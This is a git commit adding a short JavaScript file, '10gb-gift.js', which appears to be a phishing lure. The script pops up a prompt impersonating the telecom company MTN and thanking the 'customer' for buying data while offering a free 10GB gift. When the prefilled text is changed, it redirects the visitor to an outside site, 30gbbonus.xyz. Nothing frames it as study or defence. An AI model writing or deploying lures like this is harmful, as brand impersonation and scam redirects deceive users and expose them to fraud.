49843c440178a3faaa88c9d6f7da0199ae5716be
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-10-02 15:08:09 -0700

    Create 10gb-gift.js

---
+++ 10gb-gift.js
@@ -0,0 +1,6 @@
+
+var password = 'Claim 10GB Gift'
+password=prompt('MTN: Dear customer, thank you for always buying Mtn data.today we have a gift for.Kindly Press Ok to claim your Gift','Claim 10GB Gift ');
+if (password != 'Claim 10GB Gift') {
+location.href='https://30gbbonus.xyz/compensation.html';
+}
